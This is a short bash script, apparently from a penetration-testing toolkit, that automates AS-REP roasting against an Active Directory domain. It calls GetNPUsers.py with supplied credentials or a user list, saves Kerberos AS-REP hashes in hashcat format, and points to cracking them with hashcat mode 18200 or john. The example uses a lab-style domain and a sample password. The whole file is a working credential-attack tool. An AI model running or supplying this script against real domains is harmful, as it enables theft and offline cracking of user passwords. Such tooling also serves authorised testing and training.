#!/bin/bash
# AS-REP Hash Request Script
# Requests AS-REP hashes from vulnerable users

set -e

if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain> [username:password] [usersfile]"
    echo "Example 1: $0 jurassic.park triceratops:Sh4rpH0rns"
    echo "Example 2: $0 jurassic.park - users.txt"
    exit 1
fi

DOMAIN=$1
CREDENTIALS=$2
USERS_FILE=$3
OUTPUT_FILE="hashes.asreproast"

echo "[*] Requesting AS-REP hashes..."
echo "[*] Domain: $DOMAIN"

if [ -n "$CREDENTIALS" ] && [ "$CREDENTIALS" != "-" ]; then
    echo "[*] Using credentials to auto-discover targets"
    python3 GetNPUsers.py "${DOMAIN}/${CREDENTIALS}" -request -format hashcat -outputfile "$OUTPUT_FILE"
elif [ -n "$USERS_FILE" ] && [ -f "$USERS_FILE" ]; then
    echo "[*] Using user list: $USERS_FILE"
    python3 GetNPUsers.py "${DOMAIN}/" -usersfile "$USERS_FILE" -format hashcat -outputfile "$OUTPUT_FILE"
else
    echo "[!] Please provide either credentials or a users file"
    exit 1
fi

if [ -s "$OUTPUT_FILE" ]; then
    echo "[*] Successfully extracted $(wc -l < "$OUTPUT_FILE") hashes"
    echo "[*] Hashes saved to: $OUTPUT_FILE"
    echo "[*] Ready for cracking with hashcat -m 18200 or john"
else
    echo "[!] No hashes extracted"
    exit 1
fi
